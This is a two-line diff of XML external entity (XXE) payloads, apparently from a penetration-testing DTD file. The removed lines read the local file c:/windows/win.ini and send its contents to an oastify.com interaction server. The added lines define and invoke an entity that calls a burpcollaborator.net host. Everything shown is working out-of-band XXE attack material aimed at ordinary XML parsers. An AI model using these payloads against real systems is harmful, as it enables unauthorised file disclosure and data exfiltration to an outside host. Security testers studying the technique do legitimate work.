@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://s92w6jaxhr0l82ikgqem9kykpbv2jugi5.oastify.com/?%data;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://mpfyay5yr9qkm459cley3gejjap4dt.burpcollaborator.net'>">
+%all;
